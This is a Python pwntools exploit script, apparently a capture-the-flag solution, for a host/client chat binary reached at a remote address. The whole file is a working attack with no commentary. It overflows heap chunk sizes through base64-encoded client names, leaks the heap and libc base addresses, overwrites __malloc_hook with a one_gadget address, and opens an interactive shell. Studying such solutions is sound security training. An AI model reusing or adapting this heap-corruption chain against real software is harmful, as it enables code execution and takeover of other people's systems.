#!/usr/bin/env python3
from pwn import *
import base64

room_id = 'yKlJHQwpZg'

def connect_host():
    if len(sys.argv) == 1:
        return process('./host')
    else:
        s = remote('35.221.113.221', 30001)
        s.sendlineafter('a client\n', '2')
        s.sendlineafter('a room id\n', room_id)
        return s

def connect_client():
    if len(sys.argv) == 1:
        return process('./client')
    else:
        s = remote('35.221.113.221', 30001)
        s.sendlineafter('a client\n', '3')
        s.sendlineafter('a room id\n', room_id)
        return s

def set_name(s, name='A'):
    s.sendlineafter('name? >', name)
    time.sleep(0.2)

def set_name_new_client(name):
    global client
    terminate(client)
    client = connect_client()
    set_name(client, name)

def terminate(s):
    set_str(s, 'A')
    set_int(s, 1<<64)
    send(s)

def set_int(s, value):
    s.sendlineafter('> ', '1')
    s.sendlineafter('type[int/str] >', 'int')
    s.sendlineafter('data >', str(value))

def set_str(s, data):
    s.sendlineafter('> ', '1')
    s.sendlineafter('type[int/str] >', 'str')
    s.sendlineafter('data >', data)

def send_str(src, dst, data):
    set_str(src, data)
    send(src)
    recv_str(dst)

def send(s):
    s.sendlineafter('> ', '2')

def recv_str(s):
    s.sendlineafter('> ', '3')
    s.recvuntil('> string: ')

libc = ELF('./libc.so.6')

host = connect_host()
set_name(host)
client = connect_client()
set_name(client)

send_str(client, host, 'A' * 0x1f7)
send_str(client, host, 'A' * 0x67)
send_str(client, host, 'A' * 0x58)
send_str(client, host, 'A' * 0xd7)
send_str(client, host, 'A' * 0x68)

send(host)
set_name_new_client('2')
set_name_new_client(str(0xb7))
set_name_new_client(base64.b64encode(b'A' * 0xb8 + p64(0x71)))
recv_str(host)

send(host)
set_name_new_client('2')
set_name_new_client(str(0x1f7))
set_name_new_client(base64.b64encode(b'A' * 0x1f8 + p64(0x71)))
recv_str(host)

send_str(client, host, 'A' * 0x58)
send_str(client, host, 'A' * 0x58)
send_str(client, host, 'A' * 0xd7)
send_str(client, host, 'A' * 0x58)

send(host)
recv_str(client)
heap_base = u64(client.recv(6).ljust(8, b'\0')) - 0x12f10
log.info('heap base: %#x' % heap_base)

send(host)
set_name_new_client('2')
set_name_new_client(str(0x1f7))
set_name_new_client(base64.b64encode(b'A' * 0x1f8 + p64(0x71) + p64(0) * 2))
recv_str(host)

send_str(client, host, 'A' * 0x77)

send(host)
set_name_new_client('2')
set_name_new_client(str(0x1f7))
set_name_new_client(base64.b64encode(b'A' * 0x1f8 + p64(0x521)))
recv_str(host)

send_str(client, host, 'A' * 0x58)
send_str(client, host, 'A' * 0x58)

send(host)
recv_str(client)
libc.address = u64(client.recv(6).ljust(8, b'\0')) - 0x1ebbe0
log.info('libc base: %#x' % libc.address)

send_str(client, host, 'A' * 0x57)

send(host)
set_name_new_client('2')
set_name_new_client(str(0x1f7))
set_name_new_client(base64.b64encode(b'A' * 0x1f8 + p64(0x21) + p64(0) * 2))
recv_str(host)

send_str(client, host, 'A' * 0x107)

send(host)
set_name_new_client('2')
set_name_new_client(str(0x1f7))
set_name_new_client(base64.b64encode(b'A' * 0x1f8 + p64(0x21) + p64(0) * 2))
recv_str(host)

send_str(client, host, 'A' * 0x50)
send_str(client, host, 'A' * 0x107)

send(host)
set_name_new_client('2')
set_name_new_client(str(0x1f7))
set_name_new_client(base64.b64encode(b'A' * 0x1f8 + p64(0x31) + p64(libc.symbols['__malloc_hook']) + p64(0)))
recv_str(host)

one_gadgets = [0xe6c7e, 0xe6c81, 0xe6c84]
send_str(client, host, p64(libc.address + one_gadgets[1]))

send(host)

host.interactive()
